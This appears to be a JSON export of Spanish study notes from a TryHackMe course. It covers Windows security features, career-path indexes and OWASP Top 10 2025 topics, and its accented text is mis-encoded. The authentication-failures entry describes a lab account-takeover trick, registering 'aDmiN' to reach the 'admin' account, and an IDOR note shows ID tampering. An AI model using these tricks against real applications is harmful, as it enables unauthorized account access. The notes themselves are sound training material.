    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/2. System Configuration.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "La utilidad de configuraci√≥n del sistema (`MSConfig`) es para gesti√≥n de problemas avanzada y est√° hecha para diagnosticar problemas de arranque.\n\nPara ejecutar la configuraci√≥n del sistema necesitas permisos de administrador. Puedes escribir `msconfig` en el men√∫ de inicio.\n\nEsta utilidad tiene 5 pesta√±as arriba:\n\n1. General: Podemos seleccionar dispositivos y servicios para que Windows los cargue al arrancar.\n2. Boot: Aqu√≠ podemos definir varias opciones de arranque para el sistema operativo.\n3. Services: Lista todos los servicios configurados por el sistema independientemente de su estado.\n4. Startup: Windows recomienda usar el gestor de tareas (`taskmgr`) para gestionar los objetos de arranque.\n5. Tools: Hay una lista de varias herramientas que podemos ejecutar para configurar el sistema. Hay una breve descripci√≥n de lo que hacen.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Resource Monitor",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/2-windows-fundamentals-part-2/6-resource-monitor/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/6. Resource Monitor.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 2. Windows Fundamentals Part 2",
    "content": "Seguimos utilizando herramientas disponibles a trav√©s del panel de configuraci√≥n del sistema.\n\n¬øQu√© es el monitoreado de recursos (`resmon`)?\n\nEs una herramienta que nos muestra el uso de recursos como CPU, memoria, red, etc. Est√° dise√±ada, por lo general, para usuarios avanzados que necesitan solucionar problemas en el sistema o comprobar los recursos consumidos.\n\nEn la pesta√±a de vista general, Resmon tiene cuatro secciones:\n\n1. CPU.\n2. Disk.\n3. Network.\n4. Memory.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Esta lecci√≥n intentar√° dar una visi√≥n general de las funcionalidades de seguridad de Windows.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/0-windows-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/0. Windows Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/1. Introduction|1. Introduction]]\n[[2. Windows Updates]]\n[[3. Windows Security]]\n[[4. Virus and Threat Protection]]\n[[5. Firewall and Network Protection]]\n[[6. App and Browser Control]]\n[[7. Device Security]]\n[[8. BitLocker]]\n[[9. Volume Shadow Copy Service]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Firewall and Network Protection",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/5-firewall-and-network-protection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/5. Firewall and Network Protection.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "<h2>¬øQu√© es un firewall?</h2>\n\nEl tr√°fico fluct√∫a por nuestros dispositivos a trav√©s de los puertos. El firewall es lo que controla qu√© s√≠ y qu√© no entra.\n\nDentro de la pesta√±a de cortafuegos y protecci√≥n de red tenemos:\n\n- Dominio: El perfil de dominio aplica a las redes donde el sistema host puede autentificarse ante un dominio controlador.\n- Privado: El perfil privado es un perfil asignado por el usuario y es usado para designar redes privadas o dom√©sticas.\n- P√∫blico: El perfil por defecto, usado para designar redes p√∫blicas como WiFi's de aeropuertos, cafeter√≠as, etc.\n\nAl hacer click en cualquiera de los perfiles, otra pesta√±a con dos opciones aparecer√°:\n\n- Encender/Apagar firewall.\n-  Bloquear todas las conexiones entrantes.\n\n>[!WARNING] A menos que sepas exactamente lo que est√°s haciendo, es recomendable que dejes el firewall encendido.\n\n----------------\n<h2>Permitir una app en el firewall</h2>\nEn este men√∫ puedes decidir si darle permisos de entrada a una app a trav√©s del firewall. Algunas apps ofrecen informaci√≥n detallada en `Details`.\n\n------------------\n<h2>Ajustes avanzados</h2>\nConfigurar t√∫ mismo el firewall es s√≥lo para usuarios avanzados. Para buenas pr√°cticas pincha [aqu√≠](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/best-practices-configuring).\n\n>[!TIP] El comando para abrir el Windows Defender Firewall es `WF.msc`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Windows Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/3-windows-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/3. Windows Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Windows Security es el panel para controlar las herramientas que protegen tu dispositivo y tu informaci√≥n. Las secciones que aparecen en este panel son:\n\n- Virus & threat protection.\n- Firewall & network protection.\n- App & browser control.\n- Device security.\n\nAntes de seguir comentaremos los colores de estado:\n\n- Verde: Significa que tu dispositivo est√° protegido exitosamente.\n- Amarillo: Hay una recomendaci√≥n de seguridad que deber√≠as mirar.\n- Rojo: Es un aviso de que algo necesita tu atenci√≥n inmediata.\n\nPodemos hacer click en `Open Windows Security` para ver las acciones que podemos llevar a cabo con las diferentes herramientas.\n\n![[046.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Device Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/7-device-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/7. Device Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Aunque seguramente nunca cambies ninguno de estos ajustes, para hacer la gu√≠a completa, lo cubriremos.\n\nCore Isolation:\n\n- Integridad de la memoria: Previene a los ataques insertar c√≥digo malicioso en procesos de alta seguridad.\n- Procesador de seguridad: Llamado TPM (Trusted Platform Module) ofrece encriptaci√≥n adicional a tu dispositivo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Volume Shadow Copy Service",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/9-volume-shadow-copy-service/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/9. Volume Shadow Copy Service.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "El Volume Shadow Copy Service (VSS) coordina las acciones requeridas para crear una snapshot (una especie de copia de seguridad).\n\nSi VSS est√° activo (Protecci√≥n del Sistema encendido), puedes realizar las siguientes tareas:\n\n- Crear un punto de restablecimiento.\n- Realizar un restablecimiento del sistema.\n- Configurar ajustes de restablecimiento.\n- Borrar puntos de restablecimiento.\n\nLos desarrolladores de malware conocen la existencia de estos archivos e incorporan c√≥digo en sus malwares que buscan y borran estos archivos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. BitLocker",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/8-bitlocker/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/8. BitLocker.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "BitLocker es una funcionalidad de protecci√≥n de informaci√≥n mediante encriptaci√≥n. \n\nEs recomendable usar BitLocker con dispositivos con TPM. Este drive removible contiene la llave de arranque (startup key).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Virus and Threat Protection",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/4-virus-and-threat-protection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/4. Virus and Threat Protection.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Se divide en dos partes:\n\n- Peligros actuales.\n- Ajustes de protecci√≥n contra virus y amenazas.\n\n<h2>Peligros actuales</h2>\nOpciones de escaneo:\n\n- R√°pido: Comprueba aquellos ficheros en los que los peligros se suelen alojar.\n- Completo: Comprueba todos los archivos y programas activos en el disco duro.\n- Personalizado: Elije archivos y localizaciones para escanear.\n\nHistorial de amenazas:\n\n- √öltimo escaneo: Windows Defender Antivirus escanea tu dispositivo autom√°ticamente en busca de amenazas o virus.\n- Amenazas en cuarentena: Amenazas que han sido aisladas. Son eliminadas peri√≥dicamente.\n- Amenazas permitidas: Son identificados como amenazas pero t√∫ has permitido que se ejecuten.\n\n>[!WARNING] No permitas a un  objeto identificado como amenaza ejecutarse si no sabes lo que haces.\n\n--------------\n<h2>Ajustes de protecci√≥n contra virus y amenazas</h2>\nControlar ajustes\n\n- Protecci√≥n en tiempo real: Localiza y previene al malware de instalarse o ejecutarse en tu dispositivo.\n- Protecci√≥n de nube: Ofrece protecci√≥n para acceder a la √∫ltima copia de seguridad en la nube.\n- Subida autom√°tica de pruebas: Manda ejemplos de archivos a Microsoft para ayudar a protegerte a ti y a otros.\n- Acceso controlado a ficheros: Protege archivos, ficheros y √°reas de memoria de accesos no autorizados.\n- Exclusiones: Windows Defender Antivirus no escanear√° archivos excluidos.\n- Notificaciones: WDA mandar√° notificaciones con informaci√≥n cr√≠tica.\n\n>[!WARNING] Los archivos excluidos podr√≠an contener malware. Usa esta opci√≥n s√≥lo si sabes lo que haces.\n\nActualizaciones de protecci√≥n contra virus y amenazas:\n\n- Buscar actualizaciones: Comprueba manualmente si hay alguna actualizaci√≥n que afecte a WDA.\n\nProtecci√≥n contra ransomware:\n\n- Acceso controlado a ficheros: La protecci√≥n contra ransomware requiere que esta opci√≥n est√© habilitada.\n\n>[!TIP] Puedes escanear cualquier archivo o fichero haciendo click derecho y seleccionando `Scan with Microsoft Defender`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. App and Browser Control",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/6-app-and-browser-control/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/6. App and Browser Control.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "En esta secci√≥n puedes cambiar los ajustes de la Microsoft Defender SmartScreen.\n\nEsta nos protege contra el phising, webs maliciosas o la descarga de archivos infectados.\n\nHay dos secciones principales:\n\n- Comprobar apps y archivos: Ayuda a proteger tu dispositivo comprobando apps no reconocidas y archivos de la web.\n- Protecci√≥n contra exploits: Est√° integrada en Windows 10 y ayuda a prevenir ataques.\n\n>[!WARNING] A no ser que sepas al 100% lo que est√°s haciendo, se recomienda que dejes los ajustes por defecto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Windows Updates",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/2-windows-updates/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/2. Windows Updates.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Empezaremos con la actualizaciones de Windows.\n\nEs un servicio para dar actualizaciones seguras y de seguridad a los sistemas.\n\nEstas actualizaciones suelen ser lanzadas el segundo martes de cada mes. Se le llama Patch Tuesday (Martes de Parche). De todas formas si la actualizaci√≥n es urgente, esto no quiere decir que tenga que esperar hasta el siguiente martes para salir.\n\nUna de las desventajas principales de las actualizaciones en Windows, es que el sistema necesita ser reiniciado inmediatamente despu√©s (al contrario que en Linux). Es por esto que durante muchos a√±os, los usuarios pospon√≠an las actualizaciones y acababan siendo olvidadas. A partir de Windows 10, ya no puedes hacer eso.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Security Analyst",
    "path": "/apuntes/thm/1-career/1-security-analyst/1-security-analyst/",
    "src": "content/Ciberseguridad/THM/1. Career/1. Security Analyst/1. Security Analyst.md",
    "breadcrumb": "THM > 1. Career > 1. Security Analyst",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Penetration Tester",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-penetration-tester/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Penetration Tester.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester",
    "content": "[[1. Jr Penetration Tester]]\n[[2. Web Fundamentals]]\n[[3. Web Application Pentesting]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Security Engineer",
    "path": "/apuntes/thm/1-career/3-security-engineer/3-security-engineer/",
    "src": "content/Ciberseguridad/THM/1. Career/3. Security Engineer/3. Security Engineer.md",
    "breadcrumb": "THM > 1. Career > 3. Security Engineer",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Web Fundamentals",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-web-fundamentals/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Web Fundamentals.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals",
    "content": "[[1. How The Web Works]]\n[[2. Introduction to Web Hacking]]\n[[3. Burp Suite]]\n[[4. Web Hacking Fundamentals]]\n[[5. OWASP Top 10 - 2025]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Web Application Pentesting",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-web-application-pentesting/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Web Application Pentesting.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting",
    "content": "[[1. Authentication]]\n[[2. Injection Attacks]]\n[[3. Advanced Server-Side Attacks]]\n[[4. Advanced Client-Side Attacks]]\n[[5. HTTP Request Smuggling]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Jr Penetration Tester",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-jr-penetration-tester/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Jr Penetration Tester.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester",
    "content": "[[1. Introduction to Cyber Security]]\n[[2. Introduction to Pentesting]]\n[[3. Introduction to Web Hacking]]\n[[4. Burp Suite]]\n[[5. Network Security]]\n[[6. Vulnerability Research]]\n[[7. Metasploit]]\n[[8. Privilege Escalation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. OWASP Top 10 - 2025",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/5-owasp-top-10-2025/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/5. OWASP Top 10 - 2025.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025",
    "content": "1. [[0. OWASP Top 10 2025 - IAAA Failures]]\n2. [[0. OWASP Top 10 2025 - Application Design Flaws]]\n3. [[0. OWASP Top 10 2025 - Insecure Data Handling]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Burp Suite",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/3-burp-suite/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/3. Burp Suite.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/1. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/3. Burp Suite - Intruder/0. Burp Suite - Intruder]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/4. Burp Suite - Other Modules/0. Burp Suite - Other Modules]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/5. Burp Suite - Extensions/0. Burp Suite - Extensions]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. How The Web Works",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/1-how-the-web-works/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/1. How The Web Works.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 1. How The Web Works",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/1. DNS in Detail/0. DNS in Detail]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/2. HTTP in Detail/0. HTTP in Detail]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/3. How Websites Work/0. How Websites Work]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/4. Putting It All Together/0. Putting It All Together]]\n5.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Introduction to Web Hacking",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/2-introduction-to-web-hacking/2-introduction-to-web-hacking/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/2. Introduction to Web Hacking.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 2. Introduction to Web Hacking",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/1. Walking An Application/0. Walking An Application]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/2. Content Discovery/0. Content Discovery]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/3. Subdomain Enumeration/0. Subdomain Enumeration]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/4. Authentication Bypass/0. Authentication Bypass]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/5. IDOR/0. IDOR]]\n6. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/6. File Inclusion/0. File Inclusion]]\n7. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/7. Intro to SSRF/0. Intro to SSRF]]\n8. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/8. Intro to Cross-site Scripting/0. Intro to Cross-site Scripting]]\n9. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/9. Race Conditions/0. Race Conditions]]\n10. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/10. Command Injection/0. Command Injection]]\n11. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/2. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Web Hacking Fundamentals",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/4-web-hacking-fundamentals/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/4. Web Hacking Fundamentals.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/1. How Websites Work/0. How Websites Work]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/2. HTTP in Detail/0. HTTP in Detail]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/3. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/4. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n5. [[0. OWASP API Security Top 10 - 1]]\n6. [[0. OWASP API Security Top 10 - 2]]\n7. [[0. OWASP Juice Shop]]\n8. [[0. Upload Vulnerabilities]]\n9. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/9. Pickle Rick/0. Pickle Rick]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. A07 - Authentification Failures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/3-a07-authentification-failures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/3. A07 - Authentification Failures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
    "content": "Los fallos de autentificaci√≥n ocurren cuando una aplicaci√≥n no puede verificar la identidad de un usuario de manera consistente. Problemas comunes incluyen:\n\n- Enumeraci√≥n de nombres de usuario.\n- Contrase√±as d√©biles o adivinables.\n- Debilidades en el flujo de registro/login.\n- Manejo inseguro de cookies o sesiones.\n\nSi cualquiera de estos est√°n presentes, un atacante puede iniciar sesi√≥n como otra persona.\n\nPodemos tratar de meternos en la cuenta `admin`. Sabemos que su nombre de usuario es `admin` por lo que podemos intentar enga√±ar a la aplicaci√≥n para registrar un usuario con el nombre `aDmiN`.",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "4. A09 - Logging & Alerting Features",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/4-a09-logging-alerting-features/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/4. A09 - Logging & Alerting Features.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
    "content": "Cuando las aplicaciones no registran o alertan sobre eventos relevantes en la seguridad, los defensores no pueden detectar o investigar los ataques. Un buen logging (registro) necesita confirmar accountability (responsabilidad), es decir, qui√©n hizo qu√© y desde d√≥nde. En la pr√°ctica, estos fallos se ven como eventos de autentificaci√≥n faltantes, logs de error imprecisos y no alertas bajo una fuerza bruta o cambio de privilegios.",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "2. A01 - Broken Access Control",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/2-a01-broken-access-control/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/2. A01 - Broken Access Control.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
    "content": "Broken Access Control ocurre cuando el servidor no refuerza **qui√©n accede a qu√©** en cada petici√≥n. Una ocurrencia com√∫n de esto es IDOR (Insecure Direct Object Reference): si al cambiar un ID (como `?id=7 ‚Üí ?id=6`) te permite ver o editar la informaci√≥n de otra persona, eso es broken access control.\n\nEsto muestra una escalada de privilegios horizontal (mismo rol pero cosas de otro usuario) o vertical (saltar a acciones reservadas para admins) debido a que la aplicaci√≥n conf√≠a demasiado en el cliente.",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "1. What is IAAA",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/1-what-is-iaaa/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/1. What is IAAA.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
    "content": "IAAA es una manera simple de pensar c√≥mo los usuarios y sus acciones son verificadas en las aplicaciones. Cada √≠tem juega un rol crucial y no es posible saltar un nivel.Lo que significa que si un √≠tem previo no se realiza no puedes realizar los dem√°s. Los cuatro √≠tems son:\n\n- **Identity:** La cuenta √∫nica (ID, email...) que representa a una persona o servicio.\n- **Authentication:** Ofrecer la identidad )contrase√±as, OTP, passkeys...).\n- **Authorization:** Qu√© se le permite hacer a esa identidad.\n- **Accountability:** Registrar y alertar sobre qui√©n hizo qu√©, cu√°ndo y desde d√≥nde.\n\nLas tres categor√≠as del OWASP Top 10:2025 que veremos se relacionan a fallos en c√≥mo se implement√≥ la IAAA.",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "0. OWASP Top 10 2025 - IAAA Failures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/1-owasp-top-10-2025-iaaa-failures/0-owasp-top-10-2025-iaaa-failures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/1. OWASP Top 10 2025 - IAAA Failures/0. OWASP Top 10 2025 - IAAA Failures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 1. OWASP Top 10 2025 - IAAA Failures",
    "content": "[[1. What is IAAA]]\n[[2. A01 - Broken Access Control]]\n[[3. A07 - Authentification Failures]]\n[[4. A09 - Logging & Alerting Features]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OWASP Top 10 2025 - Application Design Flaws",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/0-owasp-top-10-2025-application-design-flaws/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/0. OWASP Top 10 2025 - Application Design Flaws.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
    "content": "[[1. AS02 - Security Missconfigurations]]\n[[2. AS03 - Software Supply Chain Failures]]\n[[3. AS04 - Cryptographic Failures]]\n[[4. AS06 - Insecure Design]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. AS06 - Insecure Design",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/4-as06-insecure-design/",
